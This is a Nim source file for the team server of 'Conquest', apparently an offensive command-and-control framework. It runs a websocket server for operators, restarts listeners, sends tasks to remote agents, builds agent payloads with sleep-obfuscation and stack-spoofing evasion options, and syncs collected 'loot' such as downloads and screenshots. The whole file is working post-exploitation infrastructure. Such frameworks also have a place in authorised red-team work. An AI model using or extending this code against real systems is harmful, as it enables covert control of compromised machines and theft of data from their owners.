import mummy, mummy/routers
import terminal, parsetoml, json, math, base64, times
import strutils, strformat, system, tables

import ./globals
import ./db/database
import ./core/[listener, logger, builder, websocket]
import ../common/[types, crypto, utils, profile, event]

proc header() = 
    echo ""
    echo "┏┏┓┏┓┏┓┓┏┏┓┏╋"
    echo "┗┗┛┛┗┗┫┗┻┗ ┛┗ V0.1"
    echo "      ┗  @jakobfriedl"  
    echo "─".repeat(21) 
    echo ""

proc init*(T: type Conquest, profile: Profile): Conquest = 
    var cq = new Conquest
    cq.listeners = initTable[string, Listener]()
    cq.threads = initTable[string, Thread[Listener]]()
    cq.agents = initTable[string, Agent]() 
    cq.profile = profile
    cq.keyPair = loadKeyPair(CONQUEST_ROOT & "/" & profile.getString("private-key-file"))
    cq.dbPath = CONQUEST_ROOT & "/" & profile.getString("database-file")
    cq.client = nil 
    return cq

#[
    WebSocket
]#
proc upgradeHandler(request: Request) = 
    {.cast(gcsafe).}:
        let ws = request.upgradeToWebSocket()
        cq.client = WsConnection(
            ws: ws
        )

proc websocketHandler(ws: WebSocket, event: WebSocketEvent, message: Message) {.gcsafe.} = 
    {.cast(gcsafe).}:
        case event:
        of OpenEvent:
            # New client connected to team server
            # Send the public key for the key exchange, all other information with be transmitted when the key exchange is completed
            cq.client.sendPublicKey(cq.keyPair.publicKey)
    
        of MessageEvent:
            # Continuously send heartbeat messages
            ws.sendHeartbeat() 

            let event = message.recvEvent(cq.client.sessionKey)

            case event.eventType: 
            of CLIENT_KEY_EXCHANGE: 
                let publicKey = decode(event.data["publicKey"].getStr()).toKey()
                cq.client.sessionKey = deriveSessionKey(cq.keyPair, publicKey)
            
                # Send relevant information to the client
                # C2 profile 
                cq.client.sendProfile(cq.profile)
                
                # Listeners
                for id, listener in cq.listeners: 
                    cq.client.sendListener(listener)
                
                # Agent sessions
                for id, agent in cq.agents: 
                    cq.client.sendAgent(agent)

                # Downloads & Screenshots
                for lootItem in cq.dbGetLoot():
                    cq.client.sendLoot(lootItem)

                cq.client.sendEventlogItem(LOG_SUCCESS_SHORT, "Connected to Conquest team server.")

            of CLIENT_AGENT_TASK:
                let agentId = event.data["agentId"].getStr()
                let command = event.data["command"].getStr()
                let task = event.data["task"].to(Task) 
                cq.agents[agentId].tasks.add(task)

                let timestamp = event.timestamp.fromUnix().local().format("dd-MM-yyyy HH:mm:ss")
                log(fmt"[{timestamp}]{$LOG_COMMAND}{command}", agentId)

            of CLIENT_LISTENER_START:
                let listener = event.data.to(UIListener)
                cq.listenerStart(listener.listenerId, listener.hosts, listener.address, listener.port, listener.protocol)
            
            of CLIENT_LISTENER_STOP:
                let listenerId = event.data["listenerId"].getStr()
                cq.listenerStop(listenerId)

            of CLIENT_AGENT_BUILD:
                let 
                    listenerId = event.data["listenerId"].getStr()
                    sleepDelay = event.data["sleepDelay"].getInt()
                    sleepTechnique = cast[SleepObfuscationTechnique](event.data["sleepTechnique"].getInt())
                    spoofStack = event.data["spoofStack"].getBool()
                    modules = cast[uint32](event.data["modules"].getInt())
                
                let payload = cq.agentBuild(listenerId, sleepDelay, sleepTechnique, spoofStack, modules)
                if payload.len() != 0: 
                    cq.client.sendAgentPayload(payload)

            of CLIENT_LOOT_REMOVE: 
                if not cq.dbDeleteLootById(event.data["lootId"].getStr()): 
                    cq.client.sendEventlogItem(LOG_ERROR, "Failed to delete loot.")

            of CLIENT_LOOT_SYNC: 
                let path = cq.dbGetLootById(event.data["lootId"].getStr()).path
                cq.client.sendLootSync(path, readFile(path))

            else: discard

        of ErrorEvent:
            discard 
        of CloseEvent:
            # Set the client instance to nil again to prevent debug error messages
            cq.client = nil

var lastCtrlCTime = fromUnix(0)
var ctrlC = 0

proc handleCtrlC() {.noconv.} =
    let now = getTime()
    if now - lastCtrlCTime > initDuration(seconds = 2):
        ctrlC = 0
    
    inc ctrlC
    lastCtrlCTime = now
    
    if ctrlC == 1:
        echo "\nPress Ctrl+C again to exit."
    else:
        echo "\nExiting."
        quit(0)

proc startServer*(profilePath: string) =

    # Handle team server exit
    setControlCHook(handleCtrlC)

    header()
    
    try:
        # Initialize framework context
        # Load and parse profile 
        let profile = parsetoml.parseFile(profilePath)
        cq = Conquest.init(profile)

        cq.info("Using profile \"", profile.getString("name"), "\" (", profilePath ,").")
        
        # Initialize database
        cq.dbInit()
        for agent in cq.dbGetAllAgents():
            cq.agents[agent.agentId] = agent
        for listener in cq.dbGetAllListeners():
            cq.listeners[listener.listenerId] = listener

        # Restart existing listeners
        for listenerId, listener in cq.listeners: 
            cq.listenerStart(listenerId, listener.hosts, listener.address, listener.port, listener.protocol)

        # Start websocket server
        var router: Router
        router.get("/*", upgradeHandler)
        
        # Increased websocket message length in order to support dotnet assembly execution (1GB)
        let server = newServer(router, websocketHandler, maxBodyLen = 1024 * 1024 * 1024, maxMessageLen = 1024 * 1024 * 1024)
        server.serve(Port(cq.profile.getInt("team-server.port")), "0.0.0.0")

    except CatchableError as err:
        echo err.msg
        quit(0)
    

# Conquest framework entry point
when isMainModule:
    import cligen; dispatch startServer